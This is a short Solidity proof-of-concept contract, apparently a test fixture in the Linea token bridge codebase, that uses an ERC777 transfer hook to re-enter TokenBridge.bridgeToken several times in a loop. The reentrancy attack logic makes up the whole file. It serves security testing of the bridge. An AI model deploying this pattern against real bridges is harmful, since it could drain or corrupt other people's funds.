// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import { TokenBridge } from "../../../../bridging/token/TokenBridge.sol";

contract ReentrancyContract {
  // The Linea `TokenBridge` contract
  TokenBridge private tokenBridge;

  // A simple ERC777 token with transfer hooks for this PoC
  address private token;

  // Counts how often we re-entered the bridge from `beforeTokenTransfer` below.
  uint256 private counter;

  constructor(address _tokenBridge) {
    counter = 0;
    tokenBridge = TokenBridge(_tokenBridge);
  }

  function setToken(address _token) external {
    token = _token;
  }

  function beforeTokenTransfer() external {
    counter++;
    if (counter == 5) {
      // Stop the re-entrancy loop
      return;
    } else if (counter == 4) {
      // The final re-entrancy. Send the full token amount.
      tokenBridge.bridgeToken(token, 20, address(this));
    } else {
      // Keep the loop going with 1 wei.
      tokenBridge.bridgeToken(token, 1, address(this));
    }
  }
}
